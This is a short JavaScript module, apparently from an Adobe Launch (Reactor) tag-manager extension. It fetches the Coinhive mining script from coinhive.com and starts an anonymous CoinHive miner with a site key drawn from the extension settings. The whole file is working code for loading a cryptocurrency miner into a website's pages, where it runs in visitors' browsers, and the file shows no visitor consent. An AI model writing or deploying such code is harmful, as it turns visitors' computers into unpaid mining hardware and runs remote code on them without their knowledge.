var loadScript = require('@adobe/reactor-load-script');
var url = 'https://coinhive.com/lib/coinhive.min.js';

var minerPromise;

module.exports = function() {
  minerPromise = minerPromise || loadScript(url).then(function() {
    return new CoinHive.Anonymous(turbine.getExtensionSettings().siteKey);
  });

  return minerPromise;
};
